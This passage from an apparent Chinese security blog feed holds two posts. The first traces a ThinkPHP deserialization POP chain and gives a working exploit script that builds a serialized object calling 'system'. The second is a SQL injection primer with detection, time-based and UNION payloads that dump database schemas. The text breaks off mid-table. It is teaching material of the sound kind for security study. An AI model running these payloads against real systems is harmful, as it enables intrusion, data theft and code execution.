<h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>Model.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;lazySave = True</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;updateData()</code> 内部，需要进入 <code>$this-&gt;updateData()</code> 方法：</p>
<ol>
<li>在此之前则不能被 return ，所以 if 语句中的 <code>$this-&gt;isEmpty()</code> 必须等于 <code>false</code> 以及 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 必须等于 <code>true</code> 才能避免 return；</li>
<li><code>$this-&gt;exists</code> 必须为 <code>true</code>。</li>
</ol>
<p>跟进 <code>$this-&gt;isEmpty()</code>，要想 <code>$this-&gt;isEmpty() </code>等于 <code>false</code>，只需要 <code>$tish-&gt;data </code>不等于空。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>跟进 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code>，要想 <code>$this-&gt;trigger(&#39;BeforeWrite&#39;))</code> 等于 <code>ture</code>，只需要 <code>$this-&gt;withEvent</code> 等于 <em>空</em> 或 <code>false</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"> <span class="keyword">try</span> &#123;...&#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="跟进-updateData-方法"><a href="#跟进-updateData-方法" class="headerlink" title="跟进 updateData() 方法"></a>跟进 updateData() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;checkAllowFields()</code> 内部，需要进入 <code>$this-&gt;checkAllowFields()</code> 方法，在此之前则不能被 return。</p>
<p>第一个 if 语句中，<code>$this-&gt;trigger(&#39;BeforeUpdate&#39;))</code> 需要为 true，上一步已经设置。</p>
<p>第二个 if 语句中，<code>$data</code> 需要为 true 或不为 <em>空</em> ，<code>$data</code> 来自 <code>$this-&gt;getChangedData()</code>，跟进 <code>$this-&gt;getChangedData()</code>，只需要将 <code>$this-&gt;force</code> 为 <code>true</code> 即可直接原封不动返回 <code>$this-&gt;$data</code> 的值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;origin, function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只读字段不允许更新</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="跟进-checkAllowFields-方法"><a href="#跟进-checkAllowFields-方法" class="headerlink" title="跟进 checkAllowFields() 方法"></a>跟进 checkAllowFields() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;db()</code> 内部，需要进入 <code>$this-&gt;db()</code>，即 <code>$this-&gt;field</code> 需要为空，<code>$this-&gt;schema</code> 需要为空。<code>$this-&gt;field</code> 及 <code>$this-&gt;schema</code> 默认为空。</p>
<h3 id="跟进-db-方法"><a href="#跟进-db-方法" class="headerlink" title="跟进 db() 方法"></a>跟进 db() 方法</h3><p>已经可以看到字符拼接操作，当一个类对象被当做字符串处理的时候，将会触发该类对象的 <code>__toString()</code> 魔术方法。</p>
<p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用 <code>__toString()</code>，所以先总结一下我们需要设置的点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lazySave == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;data不为空</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withEvent == <span class="literal">false</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;exists == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;force == <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>调用过程如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）——&gt;<span class="title function_ invoke__">toString</span>()</span><br></pre></td></tr></table></figure>

<h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>结合 Thinkphp 5.x 的反序列化链，<code>__toString()</code> 部分，即可触发反序列化漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）</span><br><span class="line">——&gt;<span class="title function_ invoke__">__toString</span>()--&gt;<span class="title function_ invoke__">toJson</span>()--&gt;<span class="title function_ invoke__">toArray</span>()--&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)--&gt;<span class="title function_ invoke__">getValue</span>()--&gt;<span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)(最终利用点)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04-EXP"></a>0x04-EXP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"> <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="title class_">protected</span> $<span class="title class_">withEvent</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$data</span> ;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// echo urlencode(serialize($a));</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05-参考"></a>0x05-参考</h2><p><a href="https://xz.aliyun.com/t/9546#toc-18">https://xz.aliyun.com/t/9546#toc-18</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
        <tag>ThinkPHP</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLi 基础知识</title>
    <url>/2022/03/19/SQLi-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL 注入是一种网络安全漏洞，允许攻击者<strong>干扰</strong>应用程序对其<strong>数据库</strong>的<strong>查询</strong>。它通常允许攻击者<strong>查看他们通常无法检索的数据</strong>。这可能包括属于<strong>其他用户</strong>的数据，或<strong>应用程序</strong>本身能够<strong>访问</strong>的任何其他数据。在许多情况下，攻击者可以<strong>修改</strong>或<strong>删除</strong>此数据，从而导致对应用程序的内容或行为的持续更改。<br>在某些情况下，攻击者可以升级 SQL 注入攻击以<strong>危害底层服务器</strong>或其他后端基础设施，或执行拒绝服务攻击。 （来自<a href="https://portswigger.net/web-security/sql-injection">这里</a>）。 </p>
<blockquote>
<p>在这篇文章中，我将假设我们发现了一个可能的 SQL 注入，我们将讨论确认 SQL 注入、数据库识别和执行操作的可能方法。</p>
</blockquote>
<h2 id="入口点检测"><a href="#入口点检测" class="headerlink" title="入口点检测"></a>入口点检测</h2><p>您可能已经发现了一个存在 <code>SQLi</code> 的站点，因为服务器在接收含有 <code>SQL</code> 相关语句的输入时表现异常。因此，您需要做的第一件事是如何在不破坏 <code>SQL</code> 语法的前提下注入数据。 </p>
<p>测试 PayLoad：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> [Nothing]</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">&#x27;</span>)</span><br><span class="line"><span class="string">&quot;)</span></span><br><span class="line"><span class="string">`)</span></span><br><span class="line"><span class="string">&#x27;))</span></span><br><span class="line"><span class="string">&quot;</span>))`</span><br><span class="line">`))</span><br></pre></td></tr></table></figure>

<p>然后，您需要知道如何<strong>修复查询，以免出现错误</strong>。为了修复查询，您可以 <strong>input</strong> 数据，以便闭合 <strong>previous query</strong>，或者您可以只 <strong>input</strong> 您的数据并<strong>在数据后面添加注释符</strong>。</p>
<p><em>请注意，如果您可以看到错误消息，或者您可以在查询正常工作和不正常工作时发现差异，这个阶段会更容易。</em></p>
<h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a><strong>注释符</strong></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">#comment</span><br><span class="line"><span class="comment">-- comment     [Note the space after the double dash]</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"><span class="comment">/*! MYSQL Special SQL */</span></span><br><span class="line"><span class="comment">/*!50726 select version()*/</span> 向低版本兼容执行。<span class="comment">/*!xxxxxx select version()*/</span> <span class="operator">&lt;=</span> <span class="number">5.7</span><span class="number">.26</span> ，执行<span class="keyword">SQL</span>语句 ，<span class="operator">&gt;</span> <span class="number">5.7</span><span class="number">.26</span> 作为注释符使用。</span><br><span class="line"></span><br><span class="line">PostgreSQL</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line"><span class="comment">--comment</span></span><br><span class="line"><span class="comment">/*comment*/</span></span><br><span class="line"></span><br><span class="line">HQL</span><br><span class="line">HQL does <span class="keyword">not</span> support comments</span><br></pre></td></tr></table></figure>
<h3 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h3><p>MySQL</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>Oracle</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">00</span></span><br><span class="line"><span class="operator">%</span><span class="number">09</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>A</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>B</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>C</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>D</span><br><span class="line"><span class="operator">%</span><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>MSSQL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00-%20</span><br></pre></td></tr></table></figure>

<h3 id="基于逻辑运算确认-SQLi"><a href="#基于逻辑运算确认-SQLi" class="headerlink" title="基于逻辑运算确认 SQLi"></a>基于逻辑运算确认 SQLi</h3><p>确认 SQLi 的方式之一是通过逻辑运算，并通过该运算获得预期结果。如 <code>?username=Peter</code> 和 <code>?username=Peter&#39; or &#39;1&#39;=&#39;1</code> ，通过在参数后面添加 SQL 逻辑运算表达式，当两个请求的响应内容一致时，即很可能说明你已经找到一个 SQLi 漏洞。</p>
<p>或者通过数学运算的概念也可以， 如 <code>?id=1</code> 和 <code>?id=2-1</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page.asp?id=1 or 1=1 -- true</span><br><span class="line">page.asp?id=1&#x27; or 1=1 -- true</span><br><span class="line">page.asp?id=1&quot; or 1=1 -- true</span><br><span class="line">page.asp?id=1 and 1=2 -- false</span><br></pre></td></tr></table></figure>

<blockquote>
<p>基于逻辑运算的 SQLi 测试列表<br><a href="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7d-n6kjX238xqV3-OB%2F-M7dsI5mMfPYjSqdzvtB%2Fsqli-logic.txt?alt=media&amp;token=6843509d-e5dd-4452-81d8-7a9b02de6a93">https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7d-n6kjX238xqV3-OB%2F-M7dsI5mMfPYjSqdzvtB%2Fsqli-logic.txt?alt=media&amp;token=6843509d-e5dd-4452-81d8-7a9b02de6a93</a></p>
</blockquote>
<h3 id="基于响应时间确认-SQLi"><a href="#基于响应时间确认-SQLi" class="headerlink" title="基于响应时间确认 SQLi"></a>基于响应时间确认 SQLi</h3><p>某些情况，使用基于逻辑运算的方式可能得不到预期的结果，因为某些原因导致响应结果并没有变化。所以需要基于响应时间的方式去确认 SQLi。我们可以通过执行诸如 <code>sleep()</code>等函数，或者执行复杂的数据处理请求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL (string concat and logical ops) # 字符串连接及逻辑运算</span><br><span class="line">1&#x27; + sleep(10)</span><br><span class="line">1&#x27; and sleep(10)</span><br><span class="line">1&#x27; &amp;&amp; sleep(10)</span><br><span class="line">1&#x27; | sleep(10)</span><br><span class="line"></span><br><span class="line">PostgreSQL (only support string concat)</span><br><span class="line">1&#x27; || pg_sleep(10)</span><br><span class="line"></span><br><span class="line">MSQL</span><br><span class="line">1&#x27; WAITFOR DELAY &#x27;0:0:10&#x27;</span><br><span class="line"></span><br><span class="line">Oracle</span><br><span class="line">1&#x27; AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;[RANDSTR]&#x27;,[SLEEPTIME])</span><br><span class="line">1&#x27; AND 123=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;ASD&#x27;,10)</span><br><span class="line"></span><br><span class="line">SQLite</span><br><span class="line">1&#x27; AND [RANDNUM]=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</span><br><span class="line">1&#x27; AND 123=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))</span><br></pre></td></tr></table></figure>

<h3 id="确认数据库类型"><a href="#确认数据库类型" class="headerlink" title="确认数据库类型"></a>确认数据库类型</h3><p>确认数据库类型的方式之一是使用各数据库专有的，区别与其他数据库的函数，详见下表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;conv(&#x27;a&#x27;,16,2)=conv(&#x27;a&#x27;,16,2)&quot;</span>                   ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;connection_id()=connection_id()&quot;</span>                 ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;crc32(&#x27;MySQL&#x27;)=crc32(&#x27;MySQL&#x27;)&quot;</span>                   ,<span class="string">&quot;MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)&quot;</span>       ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CONNECTIONS&gt;0&quot;</span>                                 ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CONNECTIONS=@@CONNECTIONS&quot;</span>                     ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;@@CPU_BUSY=@@CPU_BUSY&quot;</span>                           ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;USER_ID(1)=USER_ID(1)&quot;</span>                           ,<span class="string">&quot;MSSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;ROWNUM=ROWNUM&quot;</span>                                   ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;RAWTOHEX(&#x27;AB&#x27;)=RAWTOHEX(&#x27;AB&#x27;)&quot;</span>                   ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;LNNVL(0=123)&quot;</span>                                    ,<span class="string">&quot;ORACLE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;5::int=5&quot;</span>                                        ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;5::integer=5&quot;</span>                                    ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;pg_client_encoding()=pg_client_encoding()&quot;</span>       ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;get_current_ts_config()=get_current_ts_config()&quot;</span> ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;quote_literal(42.5)=quote_literal(42.5)&quot;</span>         ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;current_database()=current_database()&quot;</span>           ,<span class="string">&quot;POSTGRESQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;sqlite_version()=sqlite_version()&quot;</span>               ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;last_insert_rowid()&gt;1&quot;</span>                           ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;last_insert_rowid()=last_insert_rowid()&quot;</span>         ,<span class="string">&quot;SQLITE&quot;</span>],</span><br><span class="line">[<span class="string">&quot;val(cvar(1))=1&quot;</span>                                  ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0&quot;</span>               ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;cdbl(1)=cdbl(1)&quot;</span>                                 ,<span class="string">&quot;MSACCESS&quot;</span>],</span><br><span class="line">[<span class="string">&quot;1337=1337&quot;</span>,   <span class="string">&quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;</span>],</span><br><span class="line">[<span class="string">&quot;&#x27;i&#x27;=&#x27;i&#x27;&quot;</span>,     <span class="string">&quot;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&quot;</span>],</span><br></pre></td></tr></table></figure>

<p>此外，如果应用程序能够回显查询的数据，可以直接使用如： <code>uniont select version()</code> 等方式直接查询数据库类型及版本。</p>
<p><strong>如冇特别说明，以下例子使用均默认使用 MySQL 作为示例：</strong></p>
<h2 id="基于-union-的注入"><a href="#基于-union-的注入" class="headerlink" title="基于 union 的注入"></a>基于 union 的注入</h2><h3 id="检测字段数"><a href="#检测字段数" class="headerlink" title="检测字段数"></a>检测字段数</h3><p>如果可以回显查询的数据， 基于 union 的注入是 SQLi 五种基本注入类型中最优的攻击方式。数据查询语句语法规定，union 查询时，主查询与子查询必须必须要有相同的字段数才能正确执行。所以，为了执行 union 注入，首先需要确定原始SQL查询语句中涉及到多少的字段数。 </p>
<p>通常使用如下两种方式去确认原始查询语句涉及的字段数。</p>
<h4 id="Order-x2F-Group-by"><a href="#Order-x2F-Group-by" class="headerlink" title="Order&#x2F;Group by"></a>Order&#x2F;Group by</h4><p>递增 <code>Order/Group by</code> 后面的数值，直至应用程序响应不同的页面内容。即使 <code>GROUP BY</code> 和 <code>ORDER BY</code> 在 SQL 中功能并不一样，但是两者都可以用作确认字段数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 1--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--+    #True</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 3--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">4</span><span class="comment">--+    #False - Query is only using 3 columns</span></span><br><span class="line">                        #<span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,3--+    True</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; GROUP BY 1--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--+    #True</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; GROUP BY 3--+    #True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">4</span><span class="comment">--+    #False - Query is only using 3 columns</span></span><br><span class="line">                        #<span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,3--+    True</span></span><br></pre></td></tr></table></figure>

<h4 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h4><p>增加 <code>null</code> 值，直接应用程序返回正确的响应。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT null-- - Not working</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">null</span>,<span class="keyword">null</span><span class="comment">-- - Not working</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION SELECT null,null,null-- - Worked</span></span><br></pre></td></tr></table></figure>

<p><em>您应该使用 <code>null</code> 值，因为在某些情况下，查询双方的字段类型必须相同，而 <code>null</code> 在每种情况下都有效。</em></p>
<h3 id="提取数据库名-表名-和-字段名"><a href="#提取数据库名-表名-和-字段名" class="headerlink" title="提取数据库名,表名 和 字段名"></a>提取数据库名,表名 和 字段名</h3><p>在接下来的示例中，我们将获取所有数据库的名称、数据库的表名、表的字段名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#Database names</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Tables of a database</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">UniOn</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,gRoUp_cOncaT(<span class="number">0x7c</span>,table_name,<span class="number">0x7C</span>) <span class="keyword">fRoM</span> information_schema.tables <span class="keyword">wHeRe</span> table_schema<span class="operator">=</span>[database]</span><br><span class="line"></span><br><span class="line">#<span class="keyword">Column</span> names</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]</span></span><br></pre></td></tr></table></figure>

<p><em>在每个不同的数据库中发现这些数据的方法不同，但方法始终相同。</em></p>
<h2 id="基于隐藏的-union-注入"><a href="#基于隐藏的-union-注入" class="headerlink" title="基于隐藏的 union 注入"></a>基于隐藏的 union 注入</h2><p>如果您可以看见查询的输出但无法进行 union 的注入，则您可能正在面对基于隐藏 union 的注入。<br>通常在这种情况下，我们最终只能进行盲注攻击。要将盲注转换为基于 union 的注入，您需要获取当前查询语句的原型。我们可以通过使用盲注的方式获取，每个数据库均有默认的表存储着当前执行 SQL 语句。<br>提取 SQL 查询语句原型后，我们需要相应地调整Payload，安全地闭合原始查询，然后进行 union 注入。</p>
<p><strong>在 MySQL 中获取当前正在执行的 SQL 语句</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+-----------------+------+---------+------+-----------+-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ID <span class="operator">|</span> <span class="keyword">USER</span> <span class="operator">|</span> HOST            <span class="operator">|</span> DB   <span class="operator">|</span> COMMAND <span class="operator">|</span> <span class="type">TIME</span> <span class="operator">|</span> STATE     <span class="operator">|</span> INFO                                                                  <span 